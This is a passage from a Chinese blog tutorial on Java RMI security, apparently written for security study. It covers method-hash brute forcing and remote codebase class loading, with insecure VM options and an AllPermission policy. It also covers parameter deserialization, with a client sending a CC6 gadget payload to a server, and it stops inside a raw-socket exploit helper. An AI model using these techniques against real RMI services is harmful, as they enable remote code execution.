    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeLegacyStub</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span><span class="token punctuation">,</span> <span class="token class-name">NotFoundException</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

        <span class="token function">makeInterface</span><span class="token punctuation">(</span>className <span class="token operator">+</span> <span class="token string">&quot;Interface&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> intf <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">getCtClass</span><span class="token punctuation">(</span>className <span class="token operator">+</span> <span class="token string">&quot;Interface&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> remoteStubClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">setInterfaces</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> intf <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">addSerialVersionUID</span><span class="token punctuation">(</span>ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>

        createdClasses<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br></div></div><p>运行后可以发现不报错了，并且能看到回传的Remote的相关信息</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>remote = {RemoteObjectWrapper@1265} 
 objID = {ObjID@1269} &quot;[50c546cf:17e95126bdd:-7fff, -2439501915752422164]&quot;
 className = &quot;xyz.eki.vulrmi.remote.IMath&quot;
 boundName = &quot;math&quot;
 remoteObject = {$Proxy0@1270} &quot;Proxy[IMath,RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[192.168.56.1:32586](remote),objID:[50c546cf:17e95126bdd:-7fff, -2439501915752422164]]]]]&quot;
  h = {RemoteObjectInvocationHandler@1355} &quot;RemoteObjectInvocationHandler[UnicastRef [liveRef: [endpoint:[192.168.56.1:32586](remote),objID:[50c546cf:17e95126bdd:-7fff, -2439501915752422164]]]]&quot;
    ref = {LiveRef@1357} &quot;[endpoint:[192.168.56.1:32586](remote),objID:[50c546cf:17e95126bdd:-7fff, -2439501915752422164]]&quot;
   ref = {UnicastRef@1271} 
      host = &quot;192.168.56.1&quot;
     ep = {TCPEndpoint@1272} &quot;[192.168.56.1:32586]&quot;
      port = 32586
      csf = null
      ssf = null
      listenPort = -1
      transport = null
     id = {ObjID@1269} &quot;[50c546cf:17e95126bdd:-7fff, -2439501915752422164]&quot;
      objNum = -2439501915752422164
      space = {UID@1361} &quot;50c546cf:17e95126bdd:-7fff&quot;
       unique = 1355105999
       time = 1643178519517
       count = -32767
     ch = null
     isLocal = false
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p>通过反射我们可以将这些信息提取出来，整体效果如下</p> <p><img src="https://md.buptmerak.cn/uploads/upload_15ebd445d0c01ae503b0a55a81f8d409.png" alt=""></p> <p>从这个地方我们也可以验证RMI的远程对象实际上是存在Server上而不是registry上的，因为他的host和port并不是registry的。同时也可以验证Server只是给Registry发了一个存根信息，包括他的ObjID,host,port而不包括远程对象实际上有的方法。这一点做的是比较安全的，方法相当于客户端和服务端共有的密钥。这样一来，即使一个恶意用户访问了网关（Registry是没有做权限设计的），拿到了Server提供的地址，也没法调用服务端的方法。不过，根据之前我们对协议的分析。Server端确定调用的方法是通过方法哈希进行计算的</p> <p>计算规则如下</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">computeMethodHash</span><span class="token punctuation">(</span><span class="token class-name">Method</span> method<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">long</span> hash <span class="token operator">=</span> <span class="token number">0L</span><span class="token punctuation">;</span>
        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">MessageDigest</span> sha1 <span class="token operator">=</span> <span class="token class-name">MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">&quot;SHA&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">DataOutputStream</span> dataOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DigestOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">,</span> sha1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> methodNameAndDescriptor <span class="token operator">=</span> <span class="token function">getMethodNameAndDescriptor</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>

            dataOutputStream<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span>methodNameAndDescriptor<span class="token punctuation">)</span><span class="token punctuation">;</span>
            dataOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> hashArray <span class="token operator">=</span> sha1<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> hashArray<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                hash <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>hashArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> ignore<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            hash <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchAlgorithmException</span> complain<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SecurityException</span><span class="token punctuation">(</span>complain<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>其中<code>methodNameAndDescriptor</code>就是方法名+方法签名（方法返回值+方法参数类型），可以直接通过javap命令获取，也可以按照下面帖子的计算规则。</p> <p><a href="https://stackoverflow.com/questions/8066253/compute-a-java-functions-signature/8066268" target="_blank" rel="noopener noreferrer">https://stackoverflow.com/questions/8066253/compute-a-java-functions-signature/8066268<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="https://md.buptmerak.cn/uploads/upload_f726c3763670ab55f0ec45c65f6e0840.png" alt=""></p> <p>那么和口令爆破类似，我们可以准备一个常见rmi方法的字典，对Server端进行爆破。remote_method_guess这个工具就实现了这一功能。</p> <h2 id="_0x02-远程加载类安全问题"><a href="#_0x02-远程加载类安全问题" class="header-anchor">#</a> 0x02 远程加载类安全问题</h2> <p>在上文的报错中，我们了解到因为我们本地没有加载<code>xyz.eki.vulrmi.remote.IMath</code>这个类导致lookup失败。那么正常的情况下能否从远程拿到类信息呢。这里就要介绍我们在上文中没有具体展开的codebase参数了。</p> <p>类似classpath,java还提供了一种寻找类的方式，如果说classpath是在本地找类加载的机制，那么codebase就是提供了一种从远程寻找类加载的机制（官方文档链接：https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/codebase.html）</p> <p>根据报错，为了进行测试，我们在Client端配置SecurityManager。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;setup SecurityManager&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setSecurityManager</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>并在Client启动时加入下面的参数（VM Options）</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>-Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=vuln.policy
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>和相关policy,这里直接允许所有权限</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>//vuln.policy
grant {
    permission java.security.AllPermission;
};
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>在Registry端（有IMath类）启动时指定VM options</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>-Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://192.168.111.1:9080/ 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>再运行我们的客户端（没有IMath类）。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span> <span class="token number">21099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">IMath</span> math <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">IMath</span><span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;math&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span><span class="token function">equ</span><span class="token punctuation">(</span><span class="token constant">CC6</span><span class="token punctuation">.</span><span class="token function">getPayloadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>可以看到当客户端连接服务器找不到IMath时，就会从Registry端指定的codebase里去找，也就打到了我们监听的服务器上。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_7244c6792a004d63dd3097e902dd99c6.png" alt=""></p> <p>很容易想到这里是一个可以利用的点用来攻击客户端。同样的，如果是服务端在接受客户端请求时找不到类，那么他也会到客户端指定的codebase去找，也是一条攻击路径。Registry,Server,Client两两都可以相互通过codebase加载需要使用的远程类。并且该行为会触发类的<code>static block</code>导致任意命令执行。</p> <p>因为从远程codebase加载类具有高危性，所以只有满足如下条件的RMI客户端/服务端才能被攻击：</p> <ul><li>安装并配置了SecurityManager</li> <li>设置了 java.rmi.server.useCodebaseOnly=false 或者Java版本低于7u21、6u45(此时该值默认为false)</li></ul> <h2 id="_0x03-序列化安全问题"><a href="#_0x03-序列化安全问题" class="header-anchor">#</a> 0x03 序列化安全问题</h2> <p>通过前面的协议分析我们知道，对于RMI来说，实际上对象是绑定在本地 JVM 中，只有函数参数和返回值是通过网络传送的。那么在传输中就会涉及到三部分的序列化/反序列化。</p> <ul><li>函数参数的序列化/反序列化</li> <li>函数返回值的序列化/反序列化</li> <li>函数异常处理的序列化/反序列化</li></ul> <p>下面我们一个个的来分析其安全问题。</p> <h3 id="远程方法参数反序列化-服务端提供的远程方法"><a href="#远程方法参数反序列化-服务端提供的远程方法" class="header-anchor">#</a> 远程方法参数反序列化 （服务端提供的远程方法）</h3> <p>在前文对RMI通信过程的介绍中我们知道为了在网络中传输数据会对传递的对象进行序列化和反序列化。我们首先能想到调用函数参数的传递一定是经过序列化和反序列化的。那么我们不妨设计一个。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IMath</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">{</span>
   <span class="token class-name">Integer</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> a<span class="token punctuation">,</span><span class="token class-name">Integer</span> b<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
   <span class="token class-name">Object</span> <span class="token function">equ</span><span class="token punctuation">(</span><span class="token class-name">Object</span> a<span class="token punctuation">,</span><span class="token class-name">Object</span> b<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>客户端打服务端，果然执行了反序列化</p> <p><img src="https://md.buptmerak.cn/uploads/upload_0c5a14cb155087d191d5f3e2b96b5232.png" alt=""></p> <p>这里我们不妨再思考一个问题，因为传输的数据是都是序列化数据，如果我们通过某种方法让本来不是Object的参数，在传递数据的时候仍然传递的是一个Object，那么能不能触发反序列化呢。</p> <p>要实验这一点首先直接改函数肯定是不行的，因为远程对象要确定我们调用的是那个方法，必然会对调用的方法有一个签名标记，如果我们在本地改函数，远程就不知道我们调的函数是啥了。</p> <p>在Server端的<code>sun.rmi.server.UnicastServerRef#dispatch</code>下断点</p> <p>化简一下大概流程</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token comment">//var4是传入的Method hash 拿到对应的method</span>
<span class="token class-name">Method</span> var42 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>hashToMethod_Map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//var1是远程对象 var7是传入的参数输入流  调用this.unmarshalParameter对应的去反序列化成参数</span>
var9 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">unmarshalParameters</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var42<span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//最后调用方法得到结果</span>
var10 <span class="token operator">=</span> var42<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><code>this.unmarshalParameters</code>最后会走到<code>sun.rmi.server.UnicastRef#unmarshalValue</code></p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>    <span class="token keyword">protected</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unmarshalValue</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> var0<span class="token punctuation">,</span> <span class="token class-name">ObjectInput</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">isPrimitive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readBoolean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> <span class="token class-name">Byte</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> <span class="token class-name">Short</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> <span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> <span class="token class-name">Float</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readFloat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">==</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token constant">TYPE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">readDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">&quot;Unrecognized primitive type: &quot;</span> <span class="token operator">+</span> var0<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> var0 <span class="token operator">==</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> var1 <span class="token keyword">instanceof</span> <span class="token class-name">ObjectInputStream</span> <span class="token operator">?</span> <span class="token class-name">SharedSecrets</span><span class="token punctuation">.</span><span class="token function">getJavaObjectInputStreamReadString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readString</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">)</span>var1<span class="token punctuation">)</span> <span class="token operator">:</span> var1<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>可以看到如果传入的参数类型不是<code>int/boolean/...</code>基本类型(通过<code>var0.isPrimitive()</code>判断)，就会走到<code>var1.readObject();</code>调用反序列化，触发攻击链。我这里实验使用的版本是8u251，在u242之前，<code>String</code>类也是直接调用的<code>readObject</code>。不过问题不大，我们这边使用的方法的参数类型是<code>Integer</code>,任然走的readObject，所以会触发反序列化。</p> <p>这里直接通过JAVA Socket发包进行反序列化，参考了yxxx师傅的代码</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sendRawCall</span><span class="token punctuation">(</span><span class="token class-name">String</span> host<span class="token punctuation">,</span> <span class="token keyword">int</span> port<span class="token punctuation">,</span> <span class="token class-name">ObjID</span> objid<span class="token punctuation">,</span> <span class="token keyword">int</span> opNum<span 